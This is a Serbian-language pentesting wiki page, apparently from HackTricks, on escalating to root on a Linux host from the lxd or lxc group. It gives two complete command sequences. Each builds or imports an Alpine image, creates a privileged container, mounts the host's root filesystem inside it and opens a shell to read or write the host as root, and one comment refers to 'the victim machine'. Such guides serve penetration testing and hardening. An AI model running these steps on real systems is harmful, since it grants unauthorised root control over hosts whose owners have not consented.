# lxd/lxc Grupa - Eskalacija privilegija

{{#include ../../../banners/hacktricks-training.md}}

Ako pripadate _**lxd**_ **ili** _**lxc**_ **grupi**, možete postati root

## Eksploatacija bez interneta

### Metoda 1

Možete preuzeti alpine sliku za korišćenje sa lxd iz pouzdane biblioteke.  
Canonical objavljuje dnevne verzije na njihovom sajtu: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
Samo preuzmite **lxd.tar.xz** i **rootfs.squashfs** iz najnovije verzije. (Ime direktorijuma je datum).

Alternativno, možete instalirati na vašem računaru ovaj distro builder: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (pratite uputstva sa github-a):
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Otpremite datoteke **incus.tar.xz** (**lxd.tar.xz** ako ste preuzeli iz Canonical repozitorijuma) i **rootfs.squashfs**, dodajte sliku u repozitorijum i kreirajte kontejner:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Ako naiđete na ovu grešku _**Greška: Nema pronađenog skladišnog prostora. Molimo kreirajte novi skladišni prostor**_\
> Pokrenite **`lxd init`** i postavite sve opcije na podrazumevane. Zatim **ponovite** prethodni deo komandi

Na kraju možete izvršiti kontejner i dobiti root:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Metoda 2

Izgradite Alpine sliku i pokrenite je koristeći flag `security.privileged=true`, prisiljavajući kontejner da komunicira kao root sa host datotečnim sistemom.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
